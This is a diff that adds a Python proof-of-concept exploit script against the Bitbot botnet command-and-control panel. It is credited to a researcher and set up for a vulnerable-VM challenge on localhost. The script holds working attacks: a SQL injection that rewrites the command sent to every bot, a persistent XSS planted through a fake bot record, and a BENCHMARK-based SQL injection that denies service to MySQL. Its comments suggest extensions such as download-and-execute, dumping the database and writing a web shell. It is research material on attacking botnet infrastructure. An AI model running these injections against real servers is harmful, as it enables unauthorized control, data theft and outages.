@@ -1,0 +1,138 @@
+# Exploit Title: Bitbot C2 Panel gate2.php SQLi + XSS
+# Date: 08/19/2013
+# Exploit Author: Brian Wallace (bwall aka @botnet_hunter)
+# Software Link: https://sourceforge.net/p/flippingbitbot/wiki/Home/ (Vulnerable Virtual Machine including Bitbot)
+# Tested on: Debian/Ubuntu
+from StringIO import StringIO
+import datetime
+import urllib
+import pycurl
+import time
+
+'''
+Proof of concepts for the base attacks against the Bitbot panel.
+By: Brian Wallace (bwall) @botnet_hunter
+
+You can test these against the Vulnerable Virtual Machine challenge featuring
+Bitbot at https://sourceforge.net/p/flippingbitbot/wiki/Home/ and
+read details about more elaborate attacks against Bitbot at 
+http://cylance.com/techblog/A-Study-in-Bots-Bitbot.shtml
+
+"drop" - Sets the command on all the bots to uninstall themselves, a modified
+version could be used to get the bots to download and execute a file.
+
+"xss" - Injects a fake bot which causes a persistent XSS in the bot panel, this
+attack can be used to get information about the botter, or used to change
+configuration values, such as which mining pool the bots are sending to.  There
+is very limited room for the XSS.  Since very few of the values go through any
+sanitization, it would be possible to implement the attack across multiple
+parameters.
+
+"dos" - While this attack implements a denial of service attack, it also shows
+a simpler SQLi vulnerability than the one used to inject commands into the
+bots.  This one could be used to potentially dump the database, write a web
+shell and read files from the host.  I'll leave that to your imagination.  The
+implemented attack will DoS the MySQL server, and if repeated, eventually it
+can DoS the Apache server if a max instance count is set (default configuration
+will take only 150 to lock bots/botters out of Apache).  The current version is a
+blocking call.
+'''
+
+
+def Log(message):
+    t = time.time()
+    ts = datetime.datetime.fromtimestamp(t).strftime('%Y-%m-%d %H:%M:%S')
+    print ">>>> %(message)s" % {"message": message}
+
+
+def drop(logger, botpanel, command):
+    params = urllib.urlencode({"connection": 0,
+            "hwid": "not the right bot' OR `cmd`!='" + command +
+            "' LIMIT 1-- -",
+            "btc": "0',`cmd`='" + command})
+    query = "/gate2.php?" + params
+    logger("Initiating change command on all bots process")
+    logger("Using `%(query)s` to modify the command of each bot" % {
+        'query': botpanel + query})
+    count = 0
+    while True:
+        storage = StringIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, botpanel + query)
+        c.setopt(c.WRITEFUNCTION, storage.write)
+        c.perform()
+        c.close()
+        data = storage.getvalue()
+        if data == "":
+            logger("%(count)d bots set to be removed" % {'count': count})
+            break
+        count += 1
+
+
+def dos(logger, botpanel, command):
+    params = urllib.urlencode({"connection": 0,
+            "hwid": command})
+    query = "/gate2.php?" + params
+    logger("Initiating denial of service attack on panel")
+    logger("Using `%(query)s` to DoS the panel" % {
+        'query': botpanel + query})
+    storage = StringIO()
+    c = pycurl.Curl()
+    c.setopt(c.URL, botpanel + query)
+    c.setopt(c.WRITEFUNCTION, storage.write)
+    c.perform()
+    c.close()
+    logger("DoS query has been set")
+
+
+def xss(logger, botpanel, command):
+    params = urllib.urlencode({"connection": 0,
+                "hwid": "007",
+                "version": 'pth',
+                "country": 'RUS',
+                "windows": 'Windows' + command,
+                "sysinfo": 'False Flag',
+                "btc": 'all'})
+    query = "/gate2.php?" + params
+    logger("Initiating fake bot for XSS process")
+    logger("Using `%(query)s` to inject a fake bot to poison the panel" % {
+        'query': botpanel + query})
+    storage = StringIO()
+    c = pycurl.Curl()
+    c.setopt(c.URL, botpanel + query)
+    c.setopt(c.WRITEFUNCTION, storage.write)
+    c.perform()
+    c.close()
+    logger("Persistent XSS has been set")
+
+
+def Menu(botpanel):
+    Log("Commands:")
+    Log("xss: Persistent XSS PoC")
+    Log("drop: SQLi to set the command for all bots")
+    Log("dos: Simple SQLi implementation to DoS the MySQL server")
+    Log("quit: Exit all threads and quit")
+
+    command = raw_input("> ")
+    if command == "drop":
+        drop(Log, botpanel, "REMOVE")
+
+    if command == "xss":
+        xss(Log, botpanel, "<script>alert(1);</script>")
+
+    if command == "dos":
+        dos(Log, botpanel, "1' UNION ALL SELECT 1,1,1,1,1,1,BENCHMARK(100000" +
+        "00000000,MD5(REPEAT('a',100000000000000000000000))),1,1,1,1,'1")
+
+    if command == "quit":
+        Quit()
+        return False
+    return True
+
+if __name__ == "__main__":
+    botpanel = "http://localhost:8080"
+    Log("Using bitbot panel at " + botpanel)
+    Log("Initializing")
+
+    while Menu(botpanel):
+        pass
